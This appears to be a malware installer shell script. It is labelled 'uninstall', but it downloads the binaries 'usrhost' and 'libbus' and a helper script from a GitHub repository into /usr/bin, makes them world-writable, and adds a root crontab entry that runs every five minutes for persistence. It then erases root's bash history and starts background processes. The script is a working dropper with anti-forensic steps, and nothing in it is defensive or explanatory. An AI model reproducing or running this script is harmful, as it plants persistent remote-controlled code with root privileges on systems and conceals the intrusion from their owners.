#!/bin/bash
#
#uninstall
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/usrhost_singal.sh/d' /etc/crontab

killall usrhost
killall libbus

rm -rf /usr/bin/usrhost_singal.sh

rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus

rm -rf /usr/bin/usrhost_ver.txt


wget https://raw.githubusercontent.com/myvulweb/b1/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt

wget https://raw.githubusercontent.com/myvulweb/b1/master/usrhost_singal.sh -O /usr/bin/usrhost_singal.sh

chmod 777 /usr/bin/usrhost_singal.sh


wget https://github.com/myvulweb/b1/raw/master/usrhost -O /usr/bin/usrhost 
chmod 777 /usr/bin/usrhost
wget https://github.com/myvulweb/b1/raw/master/libbus -O /usr/bin/libbus
chmod 777 /usr/bin/libbus

echo '*/5 * * * * root /usr/bin/usrhost_singal.sh'>>/etc/crontab

service crond restart

echo >/root/.bash_history
history -c
/usr/bin/libhost &
/usr/bin/soexec &

 